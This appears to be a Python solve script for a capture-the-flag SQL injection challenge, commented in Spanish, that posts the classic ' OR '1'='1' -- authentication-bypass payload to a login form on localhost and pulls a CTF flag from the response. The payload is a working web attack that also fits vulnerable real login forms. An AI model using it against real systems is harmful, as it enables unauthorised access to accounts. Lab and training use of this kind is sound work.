# Solve Script — CTF Challenge: SQL Injection Básico
# Este script demuestra cómo resolver el reto correctamente.

import requests

TARGET = "http://localhost:8090/login"

# Payload clásico de bypass de autenticación SQLi
# Lógica: WHERE username='' OR '1'='1' -- ' AND password='...'
# La condición 1=1 siempre es verdadera, y el comentario -- anula el resto.
payload = {
    "username": "' OR '1'='1' -- ",
    "password": "cualquier_cosa"
}

session = requests.Session()
response = session.post(TARGET, data=payload, allow_redirects=True)

if "CTF{" in response.text:
    import re
    flag = re.search(r"CTF\{[^}]+\}", response.text)
    if flag:
        print(f"[+] FLAG ENCONTRADA: {flag.group()}")
else:
    print("[-] No se encontró la flag. Revisa el payload.")
    print(f"    Status: {response.status_code}")
